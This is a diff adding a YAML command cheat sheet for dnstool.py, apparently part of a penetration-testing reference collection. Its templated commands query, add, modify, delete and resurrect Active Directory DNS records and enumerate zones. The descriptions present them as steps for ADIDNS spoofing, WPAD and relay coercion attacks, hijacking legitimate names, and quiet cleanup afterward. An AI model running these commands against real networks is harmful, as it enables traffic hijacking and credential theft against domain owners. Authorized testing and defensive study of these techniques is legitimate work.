@@ -1,0 +1,51 @@
+tool: dnstool
+tags: [active-directory, pentest, dns, ldap, impacket]
+
+actions:
+ - title: dnstool - query a record
+   desc: |
+     Shows the existing DNS record for a name, default action is query.
+     Start here to verify a spoof target before adding or modifying.
+   command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|evil.domain.local}} -a query"
+
+ - title: dnstool - add a record
+   desc: |
+     Adds a new A record pointing a hostname to your IP.
+     Core primitive for ADIDNS spoofing, relay coercion, and WPAD attacks.
+   command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|evil.domain.local}} -a add -t A -d {{ip|10.10.10.10}}"
+
+ - title: dnstool - modify a record
+   desc: |
+     Changes the IP of an existing DNS record.
+     Use to hijack a legitimate name without deleting it first.
+   command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|victim.domain.local}} -a modify -t A -d {{ip|10.10.10.10}}"
+
+ - title: dnstool - remove a record
+   desc: |
+     Marks a DNS record for cleanup from the cache.
+     Quieter than ldapdelete; the scavenging process removes it.
+   command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|evil.domain.local}} -a remove"
+
+ - title: dnstool - delete record from ldap
+   desc: |
+     Force-deletes the DNS record object directly from LDAP.
+     Immediate cleanup after an attack; use when remove is too slow.
+   command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|evil.domain.local}} -a ldapdelete"
+
+ - title: dnstool - resurrect tombstoned record
+   desc: |
+     Restores a deleted (tombstoned) DNS record object.
+     Useful when a name was removed but its LDAP object still exists.
+   command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|evil.domain.local}} -a resurrect"
+
+ - title: dnstool - print all zones
+   desc: |
+     Lists every DNS zone on the server without other changes.
+     Recon step to find writable zones for spoofing.
+   command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} --print-zones"
+
+ - title: dnstool - add with custom ttl and zone
+   desc: |
+     Adds a record in a specific zone with a custom TTL.
+     Short TTLs speed up propagation during time-sensitive coercion.
+   command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} --zone {{zone|domain.local}} -r {{record|evil}} -a add -t A -d {{ip|10.10.10.10}} --ttl {{ttl|60}}"
